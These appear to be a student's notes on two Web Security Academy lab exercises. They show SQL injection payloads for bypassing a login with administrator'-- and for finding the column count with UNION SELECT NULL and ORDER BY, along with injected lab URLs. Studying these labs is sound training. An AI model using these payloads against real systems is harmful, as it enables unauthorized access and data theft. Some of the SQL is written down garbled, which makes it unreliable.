1. SQL Injection -Login Vulnerability (Lab #2 SQL injection vulnerability allowing login bypass)


Analysis:
1st Enter a ''' to see if the application breaks

then where the username is known in our case administrator
enter administrator'-- as the username the password can be anything

then the application will login after interpretting the " -- " as comment

the following SQL Query will run:
SELECT from 'firstname' FROM users WHERE username = 'administrator'-- and password ='admin'


2. SQL Injection Query to determine the number of columns returned by an attack then use that to read data from other tables

End Goal: Determine the number of columns returned by the query

SQLi Attack (Way 1)
The following command runs:
select ? from table1 UNION select NULL
-> error : if you get and errot then you have ann incorrect nnumber of columns
e.g https://ac0e1f081f98328fc0b00f2d004300ac.web-security-academy.net/filter?category=Gifts'UNION select NULL--
select ? from table1 UNION select NULL, NULL, NULL..
-> keeping adding the nulls until you get a 200 response code that shows that you have the correct number of columns
https://ac0e1f081f98328fc0b00f2d004300ac.web-security-academy.net/filter?category=Gifts'UNION select NULL,NULL,NULL--
Web Query : GET /filter?category=Gifts'+UNION+select+NULL,+NULL,+NULL--+ 
Number of columns equals : 3
Using Burp:
![Screenshot](img/sqli-burp-column-enum.png)

SQLi Attack(Way #2)
Using 'order-by'
select a,b from table1 order by 3
where three is the number of column we are ordering by f you keeping increasing that number till you get an errr it shows you have reached the maximum number of column and therefore the totoal columns available in that table

![Screenshot](img/sqli-orderby-column-enum.png)
https://ac501f031fb27988c01106bf008d00f4.web-security-academy.net/filter?category=Pets' ORDER BY 4--
The above generates an error because there's no forth column to order anything by mean we reached our maximum number of columns which is 3